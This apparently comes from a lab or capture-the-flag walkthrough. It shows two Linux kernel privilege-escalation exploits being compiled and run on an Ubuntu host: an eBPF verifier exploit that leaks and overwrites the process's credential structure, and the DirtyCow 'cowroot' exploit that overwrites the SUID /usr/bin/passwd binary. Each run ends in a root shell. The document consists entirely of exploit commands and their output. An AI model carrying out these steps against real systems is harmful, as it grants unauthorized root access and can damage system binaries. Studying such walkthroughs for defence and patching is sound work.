# 5 privesc KE

## EBF Writer

```
loly@ubuntu:~$ gcc ebf.c -o ebf
loly@ubuntu:~$ ./ebf
[.]
[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
[.]
[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
[.]
[*] creating bpf map
[*] sneaking evil bpf past the verifier
[*] creating socketpair()
[*] attaching bpf backdoor to socket
[*] skbuff => ffff88007b192b00
[*] Leaking sock struct from ffff880034aae780
[*] Sock->sk_rcvtimeo at offset 472
[*] Cred structure at ffff88007c9d7d80
[*] UID from cred structure: 1000, matches the current: 1000
[*] hammering cred structure at ffff88007c9d7d80
[*] credentials patched, launching shell...
# whoami;id;hostname
root
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare),1000(loly)
ubuntu
```

## SUID-based c0w

```
loly@ubuntu:~$ gcc cowroot.c -o cowroot -pthread
cowroot.c: In function ‘procselfmemThread’:
cowroot.c:98:17: warning: passing argument 2 of ‘lseek’ makes integer from pointer without a cast [-Wint-conversion]
         lseek(f,map,SEEK_SET);
                 ^
In file included from cowroot.c:27:0:
/usr/include/unistd.h:337:16: note: expected ‘__off_t {aka long int}’ but argument is of type ‘void *’
 extern __off_t lseek (int __fd, __off_t __offset, int __whence) __THROW;
                ^
cowroot.c: In function ‘main’:
cowroot.c:135:5: warning: implicit declaration of function ‘asprintf’ [-Wimplicit-function-declaration]
     asprintf(&backup, "cp %s /tmp/bak", suid_binary);
     ^
cowroot.c:139:5: warning: implicit declaration of function ‘fstat’ [-Wimplicit-function-declaration]
     fstat(f,&st);
     ^
cowroot.c:141:12: warning: format ‘%d’ expects argument of type ‘int’, but argument 2 has type ‘__off_t {aka long int}’ [-Wformat=]
     printf("Size of binary: %d\n", st.st_size);
            ^
loly@ubuntu:~$ ./cowroot
DirtyCow root privilege escalation
Backing up /usr/bin/passwd to /tmp/bak
Size of binary: 54256
Racing, this may take a while..
thread stopped
thread stopped
/usr/bin/passwd overwritten
Popping root shell.
Don't forget to restore /tmp/bak
root@ubuntu:/home/loly# whoami;id;hostname
root
uid=0(root) gid=1000(loly) groups=1000(loly),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare)
ubuntu
```
